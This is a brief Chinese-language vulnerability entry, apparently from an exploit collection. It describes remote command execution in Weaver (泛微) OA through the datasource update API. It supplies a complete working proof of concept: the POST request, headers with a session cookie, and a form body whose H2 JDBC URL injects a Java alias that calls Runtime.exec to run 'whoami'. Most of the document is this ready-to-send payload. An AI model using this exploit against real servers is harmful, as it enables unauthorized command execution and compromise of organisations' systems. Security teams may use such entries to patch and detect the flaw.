# 泛微datasource-update存在远程代码执行漏洞

- **系统**：泛微OA　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /api/integration/datasource/update/ HTTP/1.1`
- **关键头**：`Content-Length: 377`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: __clusterSessionIDCookieName=adcf474c-8ca4-4002-b0d7-ce6e32486666;__clusterSessi…`

**请求体 / payload**
```
pointid=aaa&amp;type=sqlserver2025&amp;iscluster=2&amp;username=333&amp;port=1&amp;dbname=aaaa&amp;password=11&amp;usepool=1&amp;minconn=5&amp;maxconn=10&amp;sortid=1&amp;id=1&amp;operate=test&amp;host=abc&amp;url=jdbc:h2:mem:test;MODE=MSSQLSERVER;INIT=CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.lang.Exception { return java.lang.Runtime.getRuntime().exec(cmd).getInputStream().toString(); } $$\;CALL EXEC('whoami');
```
- **预期**：200　|　—